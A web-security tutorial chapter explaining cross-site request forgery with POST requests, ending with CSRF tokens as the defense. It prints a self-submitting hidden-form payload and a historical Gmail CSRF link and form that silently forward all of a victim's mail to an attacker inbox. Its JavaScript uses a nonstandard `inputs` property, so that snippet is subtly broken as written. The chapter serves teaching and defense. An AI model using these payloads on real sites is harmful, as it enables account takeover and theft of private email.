# 25 - CSRF with POST Requests and Form Auto-Submit

## Why POST Doesn't Prevent CSRF

A common misconception is that using POST instead of GET prevents CSRF. It does not — the attacker just needs to use a form instead of an `<img>` tag.

### The Target Form

```html
<form action="/register" id="register" method="post">
  <input type=text name="username" value="" />
  <input type=password name="password" value="" />
  <input type=submit name="submit" value="submit" />
</form>
```

### GET-Based Attack (Trivial but Limited)

Some servers accept GET for POST endpoints:

```
http://host/register?username=test&password=passwd
```

If the server doesn't enforce the HTTP method, a simple link or `<img>` tag works. But most frameworks reject this.

### POST-Based Attack via Hidden Form + Auto-Submit

The attacker hosts a page with a hidden form that submits automatically:

```html
<form action="http://www.a.com/register" id="register" method="post">
  <input type=text name="username" value="" />
  <input type=password name="password" value="" />
  <input type=submit name="submit" value="submit" />
</form>
<script>
var f = document.getElementById("register");
f.inputs[0].value = "test";
f.inputs[1].value = "passwd";
f.submit();
</script>
```

1. The victim visits the attacker's page
2. JavaScript fills in the form fields and calls `f.submit()`
3. The browser sends a POST request to `www.a.com/register` **with the victim's cookies**
4. The server processes the request as if the victim submitted it

The victim sees a brief page flash before being redirected. The attacker can hide this in a small iframe to make it invisible.

## Real-World Example: Gmail Filter CSRF

A CSRF tool automated the entire attack into a single URL:

```
http://www.gnucitizen.org/util/csrf?
  _method=POST
  &_enctype=multipart/form-data
  &_action=https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf
  &cf2_emc=true
  &cf2_email=evilinbox@mailinator.com
  &cf1_from&cf1_to&cf1_subj&cf1_has&cf1_hasnot
  &cf1_attach=true
  &tfi&s=z&irf=on
  &nvp_bu_cftb=Create%20Filter
```

### How the CSRF Tool Works

The `gnucitizen.org/util/csrf` endpoint was a **generic CSRF-as-a-service tool**. It took URL parameters with special prefixes and dynamically generated a self-submitting HTML form.

**Parameter breakdown:**

| Parameter | Purpose |
|-----------|---------|
| `_method=POST` | The tool generates a form with `method="POST"` |
| `_enctype=multipart/form-data` | Sets the form's encoding type |
| `_action=https://mail.google.com/mail/h/...` | The form's `action` URL — where the POST goes |
| All other params (`cf2_email`, `cf1_attach`, etc.) | Become hidden `<input>` fields in the generated form |

**What the tool generates (conceptually):**

```html
<form method="POST" enctype="multipart/form-data"
      action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf">
  <input type="hidden" name="cf2_emc" value="true" />
  <input type="hidden" name="cf2_email" value="evilinbox@mailinator.com" />
  <input type="hidden" name="cf1_from" value="" />
  <input type="hidden" name="cf1_to" value="" />
  <input type="hidden" name="cf1_subj" value="" />
  <input type="hidden" name="cf1_has" value="" />
  <input type="hidden" name="cf1_hasnot" value="" />
  <input type="hidden" name="cf1_attach" value="true" />
  <input type="hidden" name="tfi" value="" />
  <input type="hidden" name="s" value="z" />
  <input type="hidden" name="irf" value="on" />
  <input type="hidden" name="nvp_bu_cftb" value="Create Filter" />
</form>
<script>document.forms[0].submit();</script>
```

**The Gmail-specific parameters:**

- `cf2_email=evilinbox@mailinator.com` — the forwarding address for the new filter
- `cf1_from`, `cf1_to`, `cf1_subj` — all empty, meaning the filter matches **all emails**
- `cf1_attach=true` — match emails with attachments (broadens the filter)
- `irf=on` — enable forwarding
- `nvp_bu_cftb=Create Filter` — the submit button value Gmail expects

**Attack flow:**

1. Attacker sends victim a link: `http://www.gnucitizen.org/util/csrf?_method=POST&...`
2. Victim clicks the link (they're logged into Gmail in the same browser)
3. The CSRF tool page generates the hidden form and auto-submits it
4. Browser sends a POST to `mail.google.com` with the victim's Gmail session cookies
5. Gmail creates a filter forwarding all emails to `evilinbox@mailinator.com`
6. From that point on, every email the victim receives is silently copied to the attacker

**Why this was devastating:** The filter persists in Gmail settings. Even after the victim closes the attacker's page, the forwarding continues indefinitely until the victim manually discovers and deletes the filter.

### Key Takeaways

- **POST does not prevent CSRF** — attackers use hidden forms with `form.submit()`
- **Any state-changing endpoint** (registration, settings, email filters) is a target
- **Auto-submit forms** fire on page load, requiring no user interaction beyond visiting the page
- **CSRF tokens** are the primary defense — the attacker cannot read the token from a cross-origin page, so they can't include it in the forged form
